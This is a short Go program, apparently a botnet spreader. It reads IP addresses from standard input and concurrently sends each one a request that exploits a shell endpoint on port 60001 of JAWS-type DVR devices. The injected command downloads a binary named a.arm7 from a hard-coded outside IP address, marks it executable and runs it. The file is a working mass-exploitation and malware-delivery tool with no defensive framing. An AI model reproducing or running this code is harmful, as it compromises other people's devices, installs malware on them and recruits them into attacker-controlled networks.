package main

import (
    "bufio"
    "strings"
    "net/http"
    "os"
	"time"
	"sync"
)

var wg sync.WaitGroup  
var queue []string;

func exploit(address string) {
    address = strings.TrimRight(address, "\r\n")
    exploir_url_addr := "http://"+address+":60001/shell?cd+/tmp;rm+-rf+a.arm7;wget+http:/\\/193.228.91.110/a.arm7;chmod+777+a.arm7;./a.arm7+jaws.exploit HTTP/1.1\r\nConnection: keep-alive\r\nCache-Control: max-age=0\r\nUser-Agent: Stonked\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\n\r\n"
    _, _ = http.Get(exploir_url_addr)
}

func main() {
    for {
        r := bufio.NewReader(os.Stdin)
        scan := bufio.NewScanner(r)
        for scan.Scan() {
            go exploit(scan.Text())
            wg.Add(1)
            time.Sleep(2*time.Millisecond)
        }
    }
}